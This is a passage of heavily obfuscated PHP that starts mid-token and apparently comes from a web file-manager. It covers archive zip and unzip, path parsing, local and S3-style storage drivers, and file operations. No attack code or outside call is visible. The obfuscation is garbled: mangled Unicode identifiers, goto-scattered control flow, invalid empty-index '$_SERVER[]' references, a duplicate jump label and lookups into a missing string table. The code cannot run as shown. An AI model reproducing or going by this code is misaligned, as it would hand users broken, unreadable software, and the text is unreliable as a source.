iconvSystem($f䵉) { return self::local()->iconvSystem($f䵉); } private static function iconvApp($bλɋ) { return self::local()->iconvApp($bλɋ); } public static function zip($DԎ, $A넒 = "\x7a\x69\160", $f = '', $Cךŭ = REPEAT_RENAME) { goto B餡; B餡: $Dǭ =& $_SERVER[]; $BëȜ = self::init($DԎ[0][$Dǭ[75]]); $cȑ̞ = self::info($DԎ[0][$Dǭ[75]]); goto B̈́; cȐɩ: if (!$a첖) { del_dir($Aؐɶ); show_json(LNG($Dǭ[1042]), !1); } del_dir($Aؐɶ); return $a첖; goto aɘ̾; dգ: if (count($cŬ) > 1) { $DרΛ = IO::info(IO::pathFather($cȑ̞[$Dǭ[75]])); $d = $DרΛ[$Dǭ[28]]; } $Bˍ = $Aؐɶ; if (!$Bˍ) { $Bˍ = get_path_father($cȑ̞[$Dǭ[75]]); $E׆ = IO::info($Bˍ); if (!$E׆[$Dǭ[189]]) { show_json(LNG($Dǭ[1041]), !1); } } goto c; a쏾: if ($f || !$Aؐɶ) { if ($Aؐɶ && strstr($Aؐɶ, TEMP_FILES)) { $D = $cŬ = array(); recursion_dir($Bˍ, $D, $cŬ, 0); foreach ($D as $bۏ) { del_dir($bۏ); } foreach ($cŬ as $bᨑ) { if ($bᨑ == $a) { continue; } del_file($bᨑ); } } return $A͉έ; } $e鳵 = self::pathFather($cȑ̞[$Dǭ[75]]); $a첖 = self::move($A͉έ, $e鳵, $Cךŭ); goto cȐɩ; c: $A͉έ = $Bˍ . $d . $Dǭ[91] . $A넒; $A͉έ = get_filename_auto($A͉έ, $Dǭ[33], $Cךŭ); $a = self::iconvSystem($A͉έ); goto Bֵ; B̈́: $Aؐɶ = !1; if (!$f && $BëȜ->getType() == $Dǭ[102]) { $cŬ = self::zipFileList($DԎ); } else { $Aؐɶ = $f ? $f : TEMP_FILES . $Dǭ[1040] . time() . rand_string(8) . $Dǭ[8]; mk_dir($Aؐɶ); $cŬ = self::zipFileList($DԎ, $Aؐɶ); } $d = $cȑ̞[$Dǭ[28]]; goto dգ; Bֵ: foreach ($cŬ as $B􆆰 => $FƖ) { $cŬ[$B􆆰] = self::iconvSystem($FƖ); } KodArchive::create($a, $cŬ); if (!IO::exist($A͉έ)) { if ($Aؐɶ) { del_dir($Aؐɶ); } show_json(LNG($Dǭ[1042]), !1); } goto a쏾; aɘ̾: } public static function unzip($Bٌߏ, $f = "\x72\145\x70\x6c\x61\x63\145") { goto c現; d: return !0; goto b׺ʕĚ; C夓: if (!($a̋ = parent::info($aѵ))) { show_json(LNG($D޽[1044]), !1); } if (!($aڞҽ = parent::infoFull($dǙ))) { $dǙ = parent::mkdir($dǙ); $aڞҽ = array($D޽[75] => $dǙ); } else { if (isset($aڞҽ[$D޽[369]]) && trim($aڞҽ[$D޽[75]], $D޽[8]) != trim($dǙ, $D޽[8])) { $B٪ = KodIO::make($aڞҽ[$D޽[461]]); $Dޤ = parent::fileNameAuto($B٪, $aڞҽ[$D޽[28]], REPEAT_RENAME_FOLDER, !0); $dǙ = parent::mkdir($B٪ . $Dޤ); $aڞҽ = array($D޽[75] => $dǙ); } } $dǙ = $aڞҽ[$D޽[75]]; goto cޝ; Fۃ: foreach ($Aƃ as $A̓) { $A̓ = self::iconvApp($A̓); self::move($A̓, $dǙ, $f); } del_dir($B); if (!$bİϟ) { del_file($d݅); } goto d; C: Hook::trigger($D޽[1050], $B); recursion_dir($B, $a, $cݤ, 0); $Aƃ = array_merge($a, $cݤ); goto Fۃ; c現: $D޽ =& $_SERVER[]; $aѵ = $Bٌߏ[$D޽[75]]; $dǙ = $Bٌߏ[$D޽[1043]]; goto C夓; cޝ: $F = self::tmpFileName($a̋); $B = TEMP_FILES . $F; del_dir($B); goto e; a򩻧: if (!@file_exists(self::iconvSystem($d݅))) { $bİϟ = self::localFilePath($aѵ, $b); $d݅ = $bİϟ ? $bİϟ : parent::download($aѵ, $d݅); } $d݅ = self::iconvSystem($d݅); $Cߎ = isset($Bٌߏ[$D޽[1045]]) ? $Bٌߏ[$D޽[1045]] : $D޽[1046]; goto Eэ; e: mk_dir($B); $b = self::fileExt($a̋); $d݅ = $B . $D޽[91] . $b; goto a򩻧; Eэ: $D單 = KodArchive::extract($d݅, $B . $D޽[8], $Cߎ); self::archiveExt(); if (!$D單[$D޽[1047]]) { show_json($D޽[1048] . $D單[$D޽[1049]], !1); } goto C; b׺ʕĚ: } public static function unzipList($aɃޒѶ) { goto cԬ; A: if (!is_dir($eȉ빷)) { mk_dir($eȉ빷); } $Dߌ셳 = $eȉ빷 . $f[8] . $C; if (!@file_exists(self::iconvSystem($Dߌ셳))) { if (isset($cȧ)) { url_request($dх, $f[1054], $Dߌ셳); } else { $FЏГ = self::localFilePath($dх, $c؞ם); $Dߌ셳 = $FЏГ ? $FЏГ : self::download($dх, $Dߌ셳); } } goto AÚ; c֧: $E칟մ = 50000; if (request_url_safe($dх)) { $cȧ = parse_url_query($dх); if (!isset($cȧ[$f[75]])) { show_json($f[1052], !1); } } $d͖ = isset($cȧ) ? $cȧ[$f[75]] : $dх; goto C; cԬ: $f =& $_SERVER[]; $dх = $aɃޒѶ[$f[75]]; $fܼ = isset($aɃޒѶ[$f[1051]]) ? $aɃޒѶ[$f[1051]] : -1; goto c֧; C: $C = self::info($d͖); $c؞ם = self::fileExt($C); $Bܤ = self::tmpFileName($C); goto A΍; e: $dއ = json_encode($c[$f[1049]]); self::setContent($E޲޻Ȍ, $dއ); if (count($c[$f[1049]]) >= $E칟մ) { show_json(sprintf(LNG($f[1053]), count($c[$f[1049]])), !1); } goto Aղϡ; AÚ: $Dߌ셳 = self::iconvSystem($Dߌ셳); if ($fܼ >= 0) { $f󇑨 = isset($aɃޒѶ[$f[1055]]) ? $aɃޒѶ[$f[1055]] : !1; $D։ = isset($aɃޒѶ[$f[28]]) ? $aɃޒѶ[$f[28]] : $f[33]; KodArchive::filePreview($Dߌ셳, $fܼ, $f󇑨, $D։); self::archiveExt(); die; } $c = KodArchive::listContent($Dߌ셳); goto B𢧔; A΍: if (isset($cȧ)) { $EֶІ = array($cȧ[$f[75]], $cȧ[$f[1051]], $cȧ[$f[28]]); $C = md5(implode($f[70], $EֶІ)) . $f[91] . get_path_ext($cȧ[$f[28]]); } else { $EֶІ = array($C[$f[28]], $C[$f[75]], $C[$f[77]]); $C = md5(implode($f[70], $EֶІ)) . $f[91] . $c؞ם; } if ($fܼ == -1) { $E޲޻Ȍ = IO_PATH_SYSTEM_TEMP . "\172\151\160\126\151\145\167\x2f{$Bܤ}\x2f{$C}\56\154\157\x67"; $b = self::infoFull($E޲޻Ȍ); if ($b) { $E޲޻Ȍ = $b[$f[75]]; $dБ = self::getContent($E޲޻Ȍ); if ($dБ) { $dއ = json_decode($dБ, !0); if (count($dއ) >= $E칟մ) { show_json(sprintf(LNG($f[1053]), count($dއ)), !1); } return $dއ; } } else { $E޲޻Ȍ = self::mkfile($E޲޻Ȍ); } } $eȉ빷 = TEMP_FILES . $Bܤ; goto A; Aղϡ: return $c[$f[1049]]; goto Dݓɢ; B𢧔: self::archiveExt(); del_dir($eȉ빷); if (!$c[$f[1047]]) { show_json($c[$f[1049]], !1); } goto e; Dݓɢ: } private static function fileExt($B㌗) { $E =& $_SERVER[]; $b = $B㌗[$E[160]]; if ($b == $E[1056]) { $Dѷ = $E[1057]; if (substr($B㌗[$E[28]], -strlen($Dѷ)) == $Dѷ) { $b = $E[1058]; } } self::archiveExt($b); return $b; } private static function zipFileList($cÜ, $c = false) { $DҷП =& $_SERVER[]; $cɏ = array(); foreach ($cÜ as $E塿) { $C = $E塿[$DҷП[75]]; if ($c) { $C = self::copy($E塿[$DҷП[75]], $c, $DҷП[764]); } if ($C && self::local()->exist($C)) { $cɏ[$E塿[$DҷП[75]]] = $C; } } if (!empty($cɏ)) { return array_values($cɏ); } show_json(LNG($DҷП[1059]), !1); } public static function tmpFileName($A) { $cǍ紝 =& $_SERVER[]; $d厐 = array($A[$cǍ紝[28]], $A[$cǍ紝[75]], $A[$cǍ紝[77]], $A[$cǍ紝[459]]); return md5(implode($cǍ紝[70], $d厐)); } private static function localFilePath($D, $Bى) { goto B웯ݻ; B웯ݻ: $CА =& $_SERVER[]; if ($Bى == $CА[1060] && strtoupper(substr(PHP_OS, 0, 3)) == $CА[1061]) { return !1; } $A = KodIO::parse($D); goto Dƪ; c҅: if ($a꩸ == $CА[102] || $a꩸ == $CА[1063]) { if (!$cȥ޺->exist($cȥ޺->path)) { show_json(LNG($CА[101]), !1); } return $cȥ޺->path; } return !1; goto A; Dƪ: if ($A[$CА[29]] == KodIO::KOD_SOURCE) { $d˭ŷ = Model($CА[772])->fileInfoGet(KodIO::sourceID($D)); if (!$d˭ŷ[$CА[75]]) { show_json($CА[1062], !1); } $D = $d˭ŷ[$CА[75]]; } $cȥ޺ = self::init($D); $a꩸ = $cȥ޺->getType(); goto c҅; A: } private static function archiveExt($A݂ = '') { $GLOBALS[$_SERVER[][1064]] = $A݂; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\x75\x72\143\145\x7d"; const KOD_USER_RECYCLE = "\173\165\x73\145\162\x52\x65\143\171\x63\x6c\145\x7d"; const KOD_USER_FAV = "\173\x75\163\x65\x72\106\x61\x76\175"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\145\x72\106\151\x6c\145\x54\x61\147\175"; const KOD_USER_FILE_TYPE = "\x7b\165\163\145\x72\x46\151\x6c\x65\124\x79\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\x6f\165\x70\122\x6f\x6f\164\123\x65\154\146\x7d"; const KOD_USER_SHARE = "\x7b\165\x73\145\x72\x53\x68\141\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\x65\162\123\x68\x61\162\145\114\x69\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\162\x65\x54\157\115\145\x7d"; const KOD_SHARE_ITEM = "\173\x73\x68\x61\162\x65\111\164\145\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\163\x68\141\162\145\x49\164\145\155\114\x69\x6e\153\x7d"; const KOD_SEARCH = "\173\x73\145\141\162\143\150\175"; const KOD_BLOCK = "\173\142\154\x6f\143\x6b\175"; const KOD_IO = "\x7b\151\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\x73\145\x72\x52\145\156\x63\x65\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\151\x76\x65\x72\175"; public static function typeList() { $c =& $_SERVER[]; return array($c[1065] => self::KOD_SOURCE, $c[1066] => self::KOD_USER_RECYCLE, $c[1067] => self::KOD_USER_FAV, $c[1068] => self::KOD_USER_FILE_TAG, $c[1069] => self::KOD_USER_FILE_TYPE, $c[1070] => self::KOD_GROUP_ROOT_SELF, $c[1071] => self::KOD_USER_SHARE, $c[1072] => self::KOD_USER_SHARE_LINK, $c[1073] => self::KOD_USER_SHARE_TO_ME, $c[1074] => self::KOD_SHARE_ITEM, $c[1075] => self::KOD_SHARE_LINK, $c[1076] => self::KOD_SEARCH, $c[1077] => self::KOD_BLOCK, $c[1078] => self::KOD_IO, $c[1079] => self::KOD_USER_RECENT, $c[1080] => self::KOD_USER_DRIVER); } public static function parse($fҌ) { goto B; B: $D =& $_SERVER[]; $fҌ = self::clear($fҌ); $Eþ = array_values(self::typeList()); goto e; e: preg_match($D[1081], $fҌ, $C֊); $f䤊 = array($D[388] => !1, $D[1082] => !1, $D[385] => !1, $D[75] => $fҌ, $D[1028] => !1, $D[1027] => $D[33]); if (is_array($C֊) && count($C֊) == 5) { $cª = $D[1083] . $C֊[2] . $D[315]; if (in_array($cª, $Eþ)) { $f䤊[$D[1028]] = $C֊[1]; $f䤊[$D[29]] = $cª; $f䤊[$D[1084]] = substr($cª, 1, -1); $f䤊[$D[367]] = $C֊[3]; } $f䤊[$D[1027]] = $C֊[4]; } goto d; d: $fͩ = array($D[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $f䤊[$D[1085]] = in_array($f䤊[$D[29]], $fͩ); return $f䤊; goto D̬; D̬: } public static function clear($cۦ𭷉) { goto d蜲; E׽: $cۦ𭷉 = preg_replace($dَ[1088], $dَ[8], $cۦ𭷉); if ($cۦ𭷉 == $dَ[8]) { return $dَ[8]; } $cۦ𭷉 = rtrim($cۦ𭷉, $dَ[8]); goto f迍; f迍: return $cۦ𭷉; goto aʉ䍉; d蜲: $dَ =& $_SERVER[]; $cۦ𭷉 = str_replace(array($dَ[1007], $dَ[217]), $dَ[50], $cۦ𭷉); $cۦ𭷉 = str_replace($dَ[93], $dَ[8], $cۦ𭷉); goto B؉; B؉: $d󇰺 = $dَ[1086]; if (substr($cۦ𭷉, 0, 3) == $dَ[1087]) { $cۦ𭷉 = substr($cۦ𭷉, 3); } while (strstr($cۦ𭷉, $d󇰺)) { $cۦ𭷉 = str_replace($d󇰺, $dَ[8], $cۦ𭷉); } goto E׽; aʉ䍉: } public static function sourceID($F) { $DגǗ =& $_SERVER[]; $A = self::parse($F); if ($A[$DגǗ[29]] !== self::KOD_SOURCE) { show_json(LNG($DגǗ[1089]), !1); } return $A[$DגǗ[367]]; } public static function make($FƱ) { if (!$FƱ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($FƱ)); } public static function makeShare($aߺ, $dݓ) { return self::makePath(self::KOD_SHARE_ITEM, $aߺ, $dݓ); } public static function makeFileTypePath($f) { return self::makePath(self::KOD_USER_FILE_TYPE, $f); } public static function makeFileTagPath($b) { return self::makePath(self::KOD_USER_FILE_TAG, $b); } public static function makePath($F, $EÑ = '', $dۈ = '') { $fǆ =& $_SERVER[]; $C˶ = substr($F, 1, -1); $F = $fǆ[1090] . $C˶ . $fǆ[1091] . $EÑ . $fǆ[1092]; $F = $dۈ ? $F . $dۈ . $fǆ[8] : $F; return $F; } public static function hashPath($f፩) { $c =& $_SERVER[]; $f运 = is_array($f፩) ? $f፩ : IO::info($f፩); $Aǆտ = _get($f运, $c[1093], $c[33]); if (!$Aǆտ) { $cö̦ = KodIO::parse($f运[$c[75]]); if (!$cö̦[$c[29]]) { $Aǆտ = IO::hashSimple($f运[$c[75]]); } } if (!$Aǆտ) { $Aǆտ = md5($f运[$c[75]] . $f运[$c[77]] . $f运[$c[107]]); } return $Aǆտ; } public static function initSystemPath() { $aݝš =& $_SERVER[]; if (defined($aݝš[1094])) { return; } define($aݝš[1094], self::systemPath($aݝš[1095])); define($aݝš[1096], self::systemPath($aݝš[1097])); define($aݝš[1098], self::systemPath($aݝš[1099])); define($aݝš[1100], self::systemPath($aݝš[1101])); } private static function systemPath($A) { goto bˍ䈌; bۨم: return $eɮ; goto E׵; bˍ䈌: $fΉ =& $_SERVER[]; $A쳭 = $fΉ[1102] . ucfirst($A); $eɮ = Model($fΉ[1103])->get($A쳭); goto bÈ; bÈ: if ($eɮ) { return $eɮ; } if ($A == $fΉ[1095]) { $eɮ = self::make(Model($fΉ[772])->systemRootPathAdd($fΉ[1104])); } else { $eɮ = self::systemPath($fΉ[1095]); $f = self::sourceID($eɮ); $eɮ = self::make(Model($fΉ[772])->mkdir($f, $A)); } Model($fΉ[1103])->set($A쳭, $eɮ); goto bۨم; E׵: } public static function systemFolder($c) { $A⸵ԕ = IO_PATH_SYSTEM_SOURCE . $c; $A = Cache::get($A⸵ԕ); if (!$A) { $d = IO::infoFull($A⸵ԕ); if (!$d) { $A = IO::mkdir($A⸵ԕ, REPEAT_SKIP); } else { $A = $d[$_SERVER[][75]]; } Cache::set($A⸵ԕ, $A, 3600 * 10); } return $A; } public static function defaultDriver() { return Model($_SERVER[][723])->defaultDriver(); } public static function defaultIO() { $c녎 =& $_SERVER[]; $F = self::defaultDriver(); return $c녎[1105] . $F[$c녎[367]] . $c녎[1092]; } public static function defaultDriverInit() { static $Bݵ炐 = false; if ($Bݵ炐) { return $Bݵ炐; } $Bݵ炐 = IO::init(self::defaultIO()); return $Bݵ炐; } public static function fileTypeList() { $fײ =& $_SERVER[]; $f = $GLOBALS[$fײ[6]][$fײ[1106]]; foreach ($f as $f => $Fڎ) { $Cޡ = $fײ[1107] . $f; $Aʉ = LNG($Cޡ); if ($Cޡ != $Aʉ) { $f[$f][$fײ[28]] = $Aʉ; } } return $f; } public static function transferType($d, $fߌ) { goto E̜; E̜: $fῂ =& $_SERVER[]; $dͰ޾ = self::driverType($d); $Bӯ = self::driverType($fߌ); goto f; e: return $fῂ[1110]; goto e୬; f: if ($dͰ޾[$fῂ[29]] == $Bӯ[$fῂ[29]] && $dͰ޾[$fῂ[1108]] == $Bӯ[$fῂ[1108]]) { return $fῂ[1109]; } if ($dͰ޾[$fῂ[29]] == $fῂ[799] && $Bӯ[$fῂ[29]] == $fῂ[102]) { return $fῂ[1055]; } if ($dͰ޾[$fῂ[29]] == $fῂ[102] && $Bӯ[$fῂ[29]] == $fῂ[799]) { return $fῂ[103]; } goto e; e୬: } public static function driverType($E̯) { goto EМ͆; EМ͆: $aȨ =& $_SERVER[]; $Aɣ = $E̯->path; $b = str_replace($aȨ[1111], $aȨ[33], strtolower($E̯->getType())); goto b╗Ԕ; e̫: return array($aȨ[29] => $aȨ[799], $aȨ[1108] => $E̯->pathDriver, $aȨ[75] => $Aɣ); goto a; b╗Ԕ: if ($b == $aȨ[713] || $b == $aȨ[1112] || $b == $aȨ[1113]) { $E̯ = self::defaultDriverInit(); } else { if ($b == $aȨ[1063] || $b == $aȨ[1114]) { $E̯ = IO::init($E̯->pathParse[$aȨ[1013]]); } } $b = str_replace($aȨ[1111], $aȨ[33], strtolower($E̯->getType())); if ($b == $aȨ[102]) { return array($aȨ[29] => $aȨ[102], $aȨ[1108] => $aȨ[33], $aȨ[75] => $Aɣ); } goto e̫; a: } } goto cႹ׋; BƮ: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($E) { if (substr($E, 0, 2) == $_SERVER[][1171]) { $E = BASIC_PATH . substr($E, 2); } return $E; } public function iconvApp($d) { $b =& $_SERVER[]; global $config; return $this->iconvTo($d, $config[$b[1169]], $config[$b[1168]]); } public function iconvSystem($FЮ) { $Eؠ =& $_SERVER[]; global $config; return $this->iconvTo($FЮ, $config[$Eؠ[1168]], $config[$Eؠ[1169]]); } public function getPathOuter($E) { goto aϡ; aϡ: $dݒ =& $_SERVER[]; $cҮ = $this->iconvApp($this->pathBase); $E = $this->iconvApp($E); goto F; Bಋ: return $this->pathDriver . $dݒ[8] . ltrim($E, $dݒ[8]); goto d; E: $E = KodIO::clear($E); $E = substr($E, strlen($cҮ)); if (empty($this->pathDriver)) { return $E; } goto Bಋ; F: if (substr($cҮ, 0, 2) == $dݒ[1171]) { $cҮ = BASIC_PATH . substr($cҮ, 2); } if (substr($E, 0, 2) == $dݒ[1171]) { $E = BASIC_PATH . substr($E, 2); } $cҮ = KodIO::clear($cҮ); goto E; d: } public function mkfile($A쇸, $Cܔ = '', $fᴣԞ = REPEAT_RENAME) { $A쇸 = $this->iconvSystem($A쇸); @touch($A쇸); if ($Cܔ) { file_put_contents($A쇸, $Cܔ); } return is_file($A쇸) ? $this->getPathOuter($A쇸) : !1; } public function mkdir($D, $e = REPEAT_SKIP) { $D = $this->iconvSystem($D); if (is_dir($D)) { return $this->getPathOuter($D); } @mkdir($D, 511, !0); return is_dir($D) ? $this->getPathOuter($D) : !1; } public function copyFile($d, $b) { $this->mkdir($this->pathFather($b)); $d = $this->iconvSystem($d); $b = $this->iconvSystem($b); $b = @copy($d, $b); return $b ? $this->getPathOuter($b) : !1; } public function moveFile($B雄, $f) { $this->mkdir($this->pathFather($f)); $B雄 = $this->iconvSystem($B雄); $f = $this->iconvSystem($f); $E = intval(@rename($B雄, $f)); if (!$E) { if ($E = intval(@copy($B雄, $f))) { @unlink($B雄); } } return $E ? $this->getPathOuter($f) : !1; } public function delFile($EՊ) { $EՊ = $this->iconvSystem($EՊ); if (!@unlink($EՊ)) { @chmod($EՊ, 511); if (!@unlink($EՊ)) { return !1; } } else { return !0; } } public function delFolder($e򊝎) { goto cЍӈ; F: if (!($C⍻ = opendir($e򊝎))) { return !1; } while (($Dﳹٓ = readdir($C⍻)) !== !1) { if ($Dﳹٓ == $aΣڙ[91] || $Dﳹٓ == $aΣڙ[1181]) { continue; } $Bԛ = $e򊝎 . $aΣڙ[8] . $Dﳹٓ; if (is_file($Bԛ) || is_link($Bԛ)) { if (!unlink($Bԛ)) { chmod($Bԛ, 511); if (!unlink($Bԛ)) { return !1; } } } else { if (is_dir($Bԛ)) { chmod($Bԛ, 511); $Bԛ = $this->iconvApp($Bԛ); if (!$this->delFolder($Bԛ)) { return !1; } } } } closedir($C⍻); goto a֑; cЍӈ: $aΣڙ =& $_SERVER[]; $e򊝎 = $this->iconvSystem($e򊝎); if (!is_dir($e򊝎)) { return !0; } goto F; a֑: return rmdir($e򊝎); goto Bʌ; Bʌ: } public function rename($AҨܬ, $b) { goto d҃޾; A: $AҨܬ = $this->iconvSystem($AҨܬ); $b장܊ = $this->pathFather($AҨܬ); $cӨ = rtrim($b장܊, $bɸ[8]) . $bɸ[8] . $FՎ; goto C˸; d҃޾: $bɸ =& $_SERVER[]; $FՎ = $this->fileNameAuto($this->pathFather($AҨܬ), $b); $FՎ = $this->iconvSystem($FՎ); goto A; C˸: $dر = @rename($AҨܬ, $cӨ); $cӨ = $this->iconvApp($cӨ); return $dر ? $this->getPathOuter($cӨ) : !1; goto A; A: } public function size($d) { $d = $this->iconvSystem($d); return (double) abs(sprintf($_SERVER[][1183], @filesize($d))); } public function info($eۂﮗ) { $eۂﮗ = $this->iconvSystem($eۂﮗ); if ($this->isFolder($eۂﮗ)) { return $this->folderInfo($eۂﮗ); } else { if ($this->isFile($eۂﮗ)) { return $this->fileInfo($eۂﮗ); } } return !1; } protected function infoChildren($DǓ, &$eÎ܊, $A͘ = true) { goto cŝ; c: if ($A͘) { $DǓ = $this->iconvSystem($DǓ); } if (!($b΢ = @opendir($DǓ))) { return; } while (($B = readdir($b΢)) !== !1) { if ($B == $A򮙰[91] || $B == $A򮙰[1181]) { continue; } $E͈ = $DǓ . $B; if (is_file($E͈) || is_link($E͈)) { $eÎ܊[$A򮙰[78]]++; $eÎ܊[$A򮙰[77]] += (double) abs(sprintf($A򮙰[1183], @filesize($E͈))); } else { if (is_dir($E͈)) { $eÎ܊[$A򮙰[79]]++; $this->infoChildren($E͈, $eÎ܊, !1); } } } goto d͹; cŝ: $A򮙰 =& $_SERVER[]; check_abort(); $DǓ = rtrim($DǓ, $A򮙰[8]) . $A򮙰[8]; goto c; d͹: closedir($b΢); goto eƺ; eƺ: } private function folderInfo($Bȑ, $C = false) { $f׃ =& $_SERVER[]; $Bȑ = rtrim($Bȑ, $f׃[8]) . $f׃[8]; $d = $this->iconvApp($this->pathThis($Bȑ)); if ($C) { return array($f׃[28] => $d, $f׃[75] => $this->getPathOuter($Bȑ), $f׃[29] => $f׃[76]); } $a = array($f׃[28] => $d, $f׃[75] => $this->getPathOuter($Bȑ), $f׃[29] => $f׃[76], $f׃[187] => @filectime($Bȑ), $f׃[107] => @filemtime($Bȑ), $f׃[1184] => @fileatime($Bȑ), $f׃[1178] => is_readable($Bȑ), $f׃[1179] => is_writable($Bȑ), $f׃[1185] => get_mode($Bȑ)); return $a; } private function fileInfo($F, $eܼۯ = false) { $C͑ǅ =& $_SERVER[]; $BԠ = $this->iconvApp($this->pathThis($F)); if ($eܼۯ) { return array($C͑ǅ[28] => $BԠ, $C͑ǅ[75] => $this->getPathOuter($F), $C͑ǅ[29] => $C͑ǅ[167], $C͑ǅ[77] => $this->size($F), $C͑ǅ[160] => $this->ext($BԠ)); } $b㊡Đ = array($C͑ǅ[28] => $BԠ, $C͑ǅ[75] => $this->getPathOuter($F), $C͑ǅ[29] => $C͑ǅ[167], $C͑ǅ[187] => @filectime($F), $C͑ǅ[107] => @filemtime($F), $C͑ǅ[1184] => @fileatime($F), $C͑ǅ[77] => $this->size($F), $C͑ǅ[160] => $this->ext($BԠ), $C͑ǅ[1178] => is_readable($F), $C͑ǅ[1179] => is_writable($F), $C͑ǅ[1185] => get_mode($F)); return $b㊡Đ; } public function exist($a왴) { $a왴 = $this->iconvSystem($a왴); return @file_exists($a왴); } public function isFile($b) { $b = $this->iconvSystem($b); return @is_file($b); } public function isFolder($C֤ч) { $C֤ч = $this->iconvSystem($C֤ч); return @is_dir($C֤ч); } public function listPath($E섵, $f̕ = false) { goto B۱; B۱: $C䪥 =& $_SERVER[]; $E섵 = $this->iconvSystem($E섵); $E섵 = rtrim($E섵, $C䪥[8]) . $C䪥[8]; goto DЮ; DЮ: $eϘʹ = array($C䪥[74] => array(), $C䪥[73] => array()); if (!($C = @opendir($E섵))) { return $eϘʹ; } while (($A¦ = readdir($C)) !== !1) { if ($A¦ == $C䪥[91] || $A¦ == $C䪥[1181]) { continue; } $E = $E섵 . $A¦; if (is_file($E)) { $eϘʹ[$C䪥[73]][] = $this->fileInfo($E, $f̕); } else { $eϘʹ[$C䪥[74]][] = $this->folderInfo($E, $f̕); } } goto c됇; c됇: closedir($C); return $eϘʹ; goto bӄ; bӄ: } public function listAll($c, &$A = array()) { goto Eڑҵ; F݌: return $A; goto a; d鈾: if (!($F = @opendir($c))) { return $A; } while (($cӛً = readdir($F)) !== !1) { if ($cӛً == $d[91] || $cӛً == $d[1181]) { continue; } $B̺ = $c . $cӛً; if (is_dir($B̺) && !is_link($B̺)) { $A[] = array($d[75] => $B̺ . $d[8], $d[76] => 1, $d[107] => @filemtime($B̺), $d[77] => 0); $this->listAll($B̺, $A); } else { $A[] = array($d[75] => $B̺, $d[76] => 0, $d[107] => @filemtime($B̺), $d[77] => $this->size($B̺)); } } closedir($F); goto F݌; Eڑҵ: $d =& $_SERVER[]; $c = $this->iconvSystem($c); $c = rtrim($c, $d[8]) . $d[8]; goto d鈾; a: } public function has($Dʅ, $Eؙ = false, $fՄ = true) { goto f۶҄; C: if ($Eؙ) { return array($c͵[191] => $F, $c͵[192] => $a); } return !1; goto A; A: $C񂯆 = 0; while (($aƎ = readdir($AʻЌ)) !== !1) { if ($aƎ == $c͵[91] || $aƎ == $c͵[1181]) { continue; } $dѬݴ = $Dʅ . $aƎ; if ($Eؙ) { $C񂯆++; if (@is_file($dѬݴ)) { $F++; } else { $a++; } if ($C񂯆 > 10000) { break; } continue; } if ($fՄ) { if (@is_file($dѬݴ)) { return !0; } } else { if (@is_dir($dѬݴ . $c͵[8])) { return !0; } } } closedir($AʻЌ); goto C; Bܲ̆: if (!($AʻЌ = @opendir($Dʅ))) { return !1; } $F = 0; $a = 0; goto A; f۶҄: $c͵ =& $_SERVER[]; $Dʅ = $this->iconvSystem($Dʅ); $Dʅ = rtrim($Dʅ, $c͵[8]) . $c͵[8]; goto Bܲ̆; A: } public function hashSimple($e񿍰) { goto E; F: fseek($b, $d - $f); $Cʻ׍ .= fread($b, $f); fclose($b); goto CⓗΞ; dߍȯ: $b = fopen($e񿍰, $d᪣[1186]); if (!$b) { return $Cʻ׍; } for ($EӾ = 0; $EӾ < $B⇍̥; $EӾ++) { fseek($b, $b * $EӾ); $Cʻ׍ .= fread($b, $f); } goto F; E穵Ӽ: if ($d <= $f * $B⇍̥) { return $this->hashMd5($e񿍰) . $d; } $Cʻ׍ = $d᪣[33]; $b = intval($d / $B⇍̥); goto dߍȯ; c勧: $d = $this->size($e񿍰); $f = 200; $B⇍̥ = 50; goto E穵Ӽ; CⓗΞ: return md5($Cʻ׍) . $d; goto E;; E: $d᪣ =& $_SERVER[]; if (!$e񿍰) { return md5($d᪣[33]); } $e񿍰 = $this->iconvSystem($e񿍰); goto c勧; E;: } public function getContent($a) { $a = $this->iconvSystem($a); return file_get_contents($a); } public function setContent($e΋, $a = '') { $e΋ = $this->iconvSystem($e΋); @file_put_contents($e΋, $a, LOCK_EX); clearstatcache(); return strlen($a) == filesize($e΋); } public function fileSubstr($E珨, $D⢔ = 0, $b盌 = false) { goto bם㐽; Aݤ: return $bŒɗ; goto e; AŶ: fseek($d, $D⢔); $bŒɗ = fread($d, $b盌); fclose($d); goto Aݤ; b͐: if ($b盌 <= 0) { return $a팛[33]; } $d = fopen($E珨, $a팛[1186]); if (!$d) { return !1; } goto AŶ; bם㐽: $a팛 =& $_SERVER[]; $E珨 = $this->iconvSystem($E珨); if ($b盌 === !1) { $b盌 = $this->size($E珨); } goto b͐; e: } public function upload($D, $E, $fȯ = false, $F = REPEAT_REPLACE) { $dϒ = $this->copyFile($E, $D); return $dϒ ? $this->getPathOuter($D) : !1; } public function setModifyTime($cė, $E嘇 = '') { @touch($cė, intval($E嘇)); } public function download($cȌ, $Cډ) { return $this->iconvSystem($cȌ); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($A) { parent::__construct($A); $this->signatureVersion($_SERVER[][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($b) { parent::__construct($b); $this->signatureVersion($_SERVER[][200]); } public function fileOutLink($BƭӒ) { $b⡓׳ =& $_SERVER[]; if (substr($BƭӒ, 0, 7) == $b⡓׳[1130]) { $BƭӒ = $b⡓׳[1131] . substr($BƭӒ, 7); } header($b⡓׳[156] . $BƭӒ); die; } } goto Dޗ; Dք: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $dΊ裎 =& $_SERVER[]; $b = $GLOBALS[$dΊ裎[6]][$dΊ裎[337]]; self::$cachePath = $b[$dΊ裎[167]][$dΊ裎[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($Cᘋ, $d䕊 = 0) { 